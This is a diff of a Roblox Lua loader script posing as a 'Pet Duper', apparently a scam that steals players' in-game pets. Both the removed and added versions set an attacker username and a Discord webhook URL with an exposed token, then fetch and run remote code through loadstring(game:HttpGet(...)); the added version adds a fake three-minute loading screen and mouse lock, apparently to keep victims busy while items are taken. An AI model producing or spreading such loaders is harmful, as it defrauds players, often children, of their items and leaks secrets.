@@ -1,4 +1,15 @@
-_G.Username = "Yuqii_qt"
-_G.HubName = "Pet Duper"
-_G.WebhookUrl = "discord.com/https://discord.com/api/webhooks/1105633987625504858/I8E0Zd4mmVxV4NYXMGxC20V6kUUHXiTrhEmX1IbcBDDXRoJaSWfljbxlfQ8YnMQTT4Gr"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+UserName = "Yuqii_qt"
+UserName2 = "Yuqii_qt"
+Webhook = "https://discord.com/api/webhooks/1105663546114715678/2oL5UAOREtJ9c15VvJ_4VjxUwAaxb-gZvoYf-D2Jd2RTN-NuOCUQQCDBkFIxDJ9eDmcn"
+
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true 
+
+_G.ScriptName = "Pet Duper"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
